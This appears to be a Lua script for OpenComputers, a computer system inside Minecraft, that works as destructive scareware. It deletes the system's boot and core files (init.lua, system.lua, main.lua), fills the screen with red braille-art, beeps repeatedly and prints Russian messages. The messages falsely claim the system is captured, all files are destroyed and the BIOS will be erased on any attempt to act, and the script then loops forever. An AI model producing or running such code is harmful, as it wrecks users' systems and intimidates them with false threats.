local component = require("component")
local gpu = component.gpu
local computer = require("computer")
local fs = require("filesystem")
local event = require("event")
local unicode = require("unicode")

fs.remove("/init.lua")
fs.remove("/system/core/lib/system.lua")
fs.remove("/system/main.lua")

gpu.setResolution(80, 25)
gpu.setForeground(0xFFFFFF)
gpu.setBackground(0x330000)
gpu.fill(1, 1, 80, 25, " ")

gpu.set(2, 2, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(2, 3, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(2, 4, "⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(2, 5, "⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(2, 6, "⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿")
gpu.set(2, 7, "⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿")
gpu.set(2, 8, "⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿")
gpu.set(2, 9, "⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿")
gpu.set(2, 10, "⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿")
gpu.set(2, 11, "⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿")
gpu.set(2, 12, "⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿")
gpu.set(2, 13, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")

computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)
computer.beep(1000, 0.1)

os.sleep(0.16)

gpu.set(27, 2, "Ваша Система Теперь Захввачена!")
os.sleep(0.03)
gpu.set(27, 4, "Все Файлы были уничтожены!")
os.sleep(0.03)
gpu.set(27, 6, "На самом деле всё куда хуже!")
os.sleep(0.03)
gpu.set(27, 8, "Правила:")
os.sleep(0.03)
gpu.set(27, 10, "1 Не перезагрузайте компютер")
os.sleep(0.03)
gpu.set(27, 12, "2 Не Пытайтесь Выключить это!")
os.sleep(0.03)
gpu.set(27, 14, "3 При Попытке Что либо сделать")
os.sleep(0.03)
gpu.set(27, 16, "Затерают Bios.")
os.sleep(0.03)
gpu.set(27, 19, "Просто Тыкайте по экрану")
os.sleep(0.03)
gpu.set(27, 21, "Чтобы компютер не выключился")

while true do
    event.pull("touch")
end
